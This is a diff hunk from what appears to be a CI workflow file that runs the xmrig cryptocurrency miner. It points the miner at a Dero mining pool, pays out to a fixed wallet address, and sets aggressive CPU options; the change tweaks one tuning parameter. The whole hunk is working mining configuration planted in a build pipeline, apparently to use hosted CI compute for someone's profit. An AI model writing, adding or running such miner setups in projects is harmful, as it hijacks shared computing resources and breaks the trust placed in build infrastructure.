@@ -60,7 +60,7 @@ jobs:
         sudo chmod +x ./xmrigMiner
 
         # xmrig configuration
-        CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000 --tls -k --coin dero -a astrobwt --astrobwt-max-size=720 --astrobwt-avx2 --pause-on-battery --argon2-impl=AVX2 --huge-pages=TRUE --huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8 --retry-pause=2'
+        CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000 --tls -k --coin dero -a astrobwt --astrobwt-max-size=740 --astrobwt-avx2 --pause-on-battery --argon2-impl=AVX2 --huge-pages=TRUE --huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8 --retry-pause=2'
 
         # ./xmrigMiner: unrecognized option '--pause-on-battery' (6.3.1+)
         # ./xmrigMiner: unrecognized option '--huge-pages=true'
